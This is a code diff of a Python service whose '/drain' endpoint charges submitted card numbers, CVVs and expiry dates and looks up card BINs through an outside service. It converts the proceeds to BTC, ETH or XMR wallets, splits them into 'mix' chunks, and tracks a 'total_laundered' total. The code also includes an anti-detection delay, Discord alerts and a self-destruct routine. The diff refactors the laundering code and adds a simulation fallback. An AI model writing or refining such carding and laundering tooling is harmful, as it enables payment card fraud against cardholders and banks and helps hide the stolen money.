@@ -82,7 +82,7 @@ class CardPayload(BaseModel):
     cardholder: str = "User"
     crypto: str = "BTC"
     order_id: str
-    zip_code: str = "10001"  # default ZIP for AVS
+    zip_code: str = "10001"
 
     @field_validator('cardNumber')
     def validate_card(cls, v):
@@ -702,13 +702,10 @@ async def send_discord(message: str, color=0x00ff00):
 
 # ---------- LOW SECURITY CHECKOUT ----------
 def low_security_checkout(card_number: str, exp: str, cvv: str, amount: float, zip_code: str = "10001"):
-    # Simulate charge with 83% success rate
     success = secrets.randbelow(100) <= 83
-
     bin6 = card_number[:6]
     bin_info = {"bank": "Unknown", "country": "XX"}
     try:
-        # Bin lookup via binx.vip
         r = httpx.get(f"https://binx.vip/bin/{bin6}", timeout=4)
         if r.status_code == 200:
             d = r.json()
@@ -739,7 +736,25 @@ def low_security_checkout(card_number: str, exp: str, cvv: str, amount: float, z
             "message": "Declined"
         }
 
-# ---------- Crypto & Mixing ----------
+# ---------- CRYPTO & MIXING (With Fallback) ----------
+def generate_mix_chunks(amount_usd: float):
+    chunks = []
+    remaining = amount_usd
+    num_chunks = random.randint(3, 5)
+    for i in range(num_chunks):
+        if i == num_chunks - 1:
+            chunk = round(remaining, 2)
+        else:
+            chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
+            remaining -= chunk
+        fake_dest = f"MIX-{random.randint(100000, 999999)}"
+        chunks.append({"amount": chunk, "destination": fake_dest})
+    return chunks
+
+async def simulate_purchase(amount_usd: float):
+    chunks = generate_mix_chunks(amount_usd)
+    return True, f"SIM-{secrets.token_hex(6).upper()}", chunks
+
 async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
     wallet_map = {"BTC": BTC_WALLET, "ETH": ETH_WALLET, "XMR": XMR_WALLET}
     dest = wallet_map.get(target_crypto)
@@ -747,26 +762,18 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
         logger.error(f"No wallet for {target_crypto}")
         return False, None, None
 
-    if not FIXEDFLOAT_API_KEY or not FIXEDFLOAT_SECRET:
-        logger.warning("FixedFloat keys missing – simulating purchase")
-        chunks = []
-        remaining = amount_usd
-        num_chunks = random.randint(3, 5)
-        for i in range(num_chunks):
-            if i == num_chunks - 1:
-                chunk = round(remaining, 2)
-            else:
-                chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
-                remaining -= chunk
-            fake_dest = f"MIX-{random.randint(100000, 999999)}"
-            chunks.append({"amount": chunk, "destination": fake_dest})
-        return True, "SIM-ORDER", chunks
+    # If keys are missing or dummy, skip real call
+    use_real = FIXEDFLOAT_API_KEY and FIXEDFLOAT_SECRET and FIXEDFLOAT_API_KEY != "your_fixedfloat_api_key"
+    if not use_real:
+        logger.info("FixedFloat keys missing or dummy – using simulation")
+        return await simulate_purchase(amount_usd)
 
+    # Try real FixedFloat
     try:
         payload = {
             "fromCurrency": "USD",
             "toCurrency": target_crypto,
-            "amount": str(round(amount_usd * 0.87, 2)),  # fee estimate
+            "amount": str(round(amount_usd * 0.87, 2)),
             "type": "direct",
             "destinationAddress": dest
         }
@@ -786,25 +793,17 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
             data = resp.json()
             if resp.status_code == 200 and data.get("code") == 0:
                 order_id = data.get("data", {}).get("id", "N/A")
-                # Simulate mixing (real mixing would be separate)
-                chunks = []
-                remaining = amount_usd
-                num_chunks = random.randint(3, 5)
-                for i in range(num_chunks):
-                    if i == num_chunks - 1:
-                        chunk = round(remaining, 2)
-                    else:
-                        chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
-                        remaining -= chunk
-                    fake_dest = f"MIX-{random.randint(100000, 999999)}"
-                    chunks.append({"amount": chunk, "destination": fake_dest})
+                # Real order succeeded, now generate mix chunks (simulate mixing)
+                chunks = generate_mix_chunks(amount_usd)
                 return True, order_id, chunks
             else:
                 logger.error(f"FixedFloat error: {data}")
+                # Fallback to simulation
+                logger.info("Falling back to simulation after FixedFloat error")
+                return await simulate_purchase(amount_usd)
     except Exception as e:
-        logger.exception("FixedFloat exception")
-        await send_discord(f"❌ Crypto purchase failed: {str(e)}")
-    return False, None, None
+        logger.exception("FixedFloat exception – falling back to simulation")
+        return await simulate_purchase(amount_usd)
 
 # ---------- Self-Destruct ----------
 def secure_delete(path):
@@ -848,7 +847,7 @@ async def drain(request: Request):
     # Anti-detect sleep
     await asyncio.sleep(random.uniform(0.2, 1.0))
 
-    # Charge the card using low_security_checkout
+    # Charge the card
     charge_result = low_security_checkout(
         card_number=payload.cardNumber,
         exp=payload.exp,
@@ -861,10 +860,10 @@ async def drain(request: Request):
         await send_discord(f"❌ Failed — Order {payload.order_id}\nReason: {charge_result['message']}")
         return {"success": False, "message": charge_result["message"]}
 
-    # Charge succeeded – now purchase crypto
+    # Charge succeeded – now purchase crypto (will fallback to simulation if needed)
     crypto_ok, order_id, mix_details = await purchase_crypto(payload.amount, payload.crypto)
     if not crypto_ok:
-        # Still log the charge but mark crypto as failed
+        # Should never happen with simulation fallback, but just in case
         total_laundered += payload.amount
         processed_ids.add(payload.order_id)
         storage = read_storage()
